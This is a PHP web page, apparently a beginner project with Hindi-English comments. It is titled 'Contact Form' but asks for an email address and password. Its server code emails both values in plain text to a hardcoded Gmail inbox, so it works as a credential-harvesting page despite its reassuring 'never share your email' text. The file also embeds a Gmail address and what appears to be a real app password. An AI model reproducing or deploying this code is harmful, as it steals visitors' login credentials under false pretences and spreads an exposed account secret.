<?php
use PHPMailer\PHPMailer\PHPMailer; 
use PHPMailer\PHPMailer\Exception; 

$status_message = "";

// Form submit hone par hi code execute hoga
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Direct files include (Bina Composer/autoload.php ke)
    require 'PHPMailer/src/Exception.php';
    require 'PHPMailer/src/PHPMailer.php';
    require 'PHPMailer/src/SMTP.php';

    $mail = new PHPMailer(true); 

    try { 
        // Server settings
        $mail->isSMTP(); 
        $mail->Host       = 'smtp.gmail.com'; 
        $mail->SMTPAuth   = true; 
        $mail->Username   = 'nagarkishan1908@gmail.com'; // Aapka Gmail address
        $mail->Password   = 'imhf lsyf wiyr vbvp';   // Aapka 16-digit App Password
        $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS; 
        $mail->Port       = 587; 

        // Recipients
        $mail->setFrom('nagarkishan1908@gmail.com', 'Website Form'); 
        $mail->addAddress('nagarkishan1908@gmail.com'); // Jiske inbox me notification bhejna hai

        // Content
        $mail->isHTML(true); 
        $mail->Subject = 'New Form Submission Notification'; 
        
        $email_input    = htmlspecialchars($_POST['email']);
        $password_input = htmlspecialchars($_POST['password']);
        
        $mail->Body    = "<b>User Email:</b> " . $email_input . "<br><b>Password:</b> " . $password_input; 

        $mail->send(); 
        $status_message = "<div class='alert alert-success mt-3'>Email Notification sent successfully!</div>"; 
    } catch (Exception $e) { 
        $status_message = "<div class='alert alert-danger mt-3'>Message could not be sent. Mailer Error: {$mail->ErrorInfo}</div>"; 
    }
}
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Contact Form</title>
    <link
      rel="stylesheet"
      href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/css/bootstrap.min.css"
    />
    <style>
      * {
        margin: 0%;
        padding: 0%;
        box-sizing: border-box;
      }
      html,
      body {
        height: 100%;
        width: 100%;
        background-color: cadetblue;
        display: flex;
        align-items: center;
        justify-content: center;
      }
      .f {
        min-height: 50vh;
        width: 35vw;
        padding: 30px;
        background-color: darkcyan;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        border-radius: 20px;
        box-shadow: -1px 1px 3px 10px rgb(51, 73, 60);
        color: white;
      }
      form {
        width: 100%;
      }
    </style>
  </head>
  <body>
    <div class="f">
      <form method="POST" action="">
        <div class="mb-3">
          <label for="exampleInputEmail1" class="form-label">Email address</label>
          <input
            type="email"
            name="email"
            class="form-control"
            id="exampleInputEmail1"
            aria-describedby="emailHelp"
            required
          />
          <div id="emailHelp" class="form-text text-light">
            We'll never share your email with anyone else.
          </div>
        </div>
        <div class="mb-3">
          <label for="exampleInputPassword1" class="form-label">Password</label>
          <input
            type="password"
            name="password"
            class="form-control"
            id="exampleInputPassword1"
            required
          />
        </div>
        <div class="mb-3 form-check">
          <input type="checkbox" class="form-check-input" id="exampleCheck1" />
          <label class="form-check-label" for="exampleCheck1">Check me out</label>
        </div>
        <button type="submit" class="btn btn-primary w-100">Submit</button>
      </form>

      <!-- Success/Error Message Display -->
      <?php if (!empty($status_message)) { echo $status_message; } ?>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.8/dist/js/bootstrap.bundle.min.js"></script>
  </body>
</html>